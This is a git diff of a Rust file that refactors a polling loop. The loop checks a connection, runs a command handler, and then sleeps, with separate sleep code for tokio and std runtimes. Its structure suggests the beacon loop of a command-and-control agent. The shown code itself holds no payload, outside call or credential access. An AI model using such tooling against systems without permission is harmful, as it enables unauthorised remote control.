@@ -1,6 +1,6 @@
 use libc_print::libc_println;
 
-use std::{sync::Arc, time::Duration};
+use std::{sync::Arc, thread, time::Duration};
 
 pub mod command;
 pub mod common;
@@ -26,6 +26,8 @@ use mod_tokio_runtime::TokioRuntimeWrapper;
 
 #[cfg(feature = "std-runtime")]
 use mod_std_runtime::CustomRuntime;
+
+use rs2_runtime::Runtime;
 
 /// Main routine that initializes the runtime and repeatedly checks the connection status.
 pub fn routine() {
@@ -54,14 +56,28 @@ pub fn routine() {
                 command_handler(rt.clone());
             }
 
-            // Sleep for 15 seconds before checking again, ensuring all tasks are done.
-            libc_println!("Sleep: {}", instance().config.polling_interval);
-            rt.handle().block_on(async {
-                tokio::time::sleep(Duration::from_secs(
-                    instance().config.polling_interval as u64,
-                ))
-                .await;
-            });
+            #[cfg(feature = "tokio-runtime")]
+            {
+                // Sleep for 15 seconds before checking again, ensuring all tasks are done.
+                libc_println!("Sleep: {}", instance().config.polling_interval);
+                rt.block_on(async {
+                    tokio::time::sleep(Duration::from_secs(
+                        instance().config.polling_interval as u64,
+                    ))
+                    .await;
+                });
+            }
+
+            #[cfg(feature = "std-runtime")]
+            {
+                // Sleep for 15 seconds before checking again, ensuring all tasks are done.
+                libc_println!("Sleep: {}", instance().config.polling_interval);
+                rt.block_on(async {
+                    thread::sleep(Duration::from_secs(
+                        instance().config.polling_interval as u64,
+                    ))
+                });
+            }
         }
     }
 }
